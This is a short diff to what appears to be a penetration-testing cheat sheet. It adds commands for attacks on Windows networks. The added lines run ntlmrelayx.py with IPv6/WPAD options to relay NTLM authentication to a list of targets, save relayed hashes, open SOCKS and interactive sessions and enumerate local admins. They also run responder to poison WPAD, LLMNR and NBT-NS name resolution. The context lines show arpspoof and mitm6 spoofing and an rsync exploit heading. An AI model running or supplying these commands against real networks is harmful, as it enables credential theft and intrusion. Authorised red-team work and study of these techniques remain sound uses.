@@ -329,6 +329,11 @@ arpspoof -i eth0 -t <DNSIP> <GATEWAY>;
 
 # ipv6 for ipv4 (dhcp in greyspace out of scope?)
 mitm6.py -d <DOMAIN> -hw <TARGET>
+ntlmrelayx.py -6 -wh $WPAD -tf <TARGETSFILE> --smb-port 445 --http-port 80 -l ./ -of hashes-relayed -smb2support -socks --enum-local-admins -debug -i -w;
+
+# poison wpad, llmnr, nbtns, etc... (edit responder.conf for smb and http)
+responder -v -I eth0 -dwrf -P -v
+ntlmrelayx.py -ts  -tf <TARGETSFILE> --smb-port 445 --http-port 80 -l ./ -of hashes-relayed -smb2support --remove-mic --enum-local-admins -debug -i -w;
 ```
 
 ###### INTERNAL / EXTERNAL RSYNC EXPLOIT
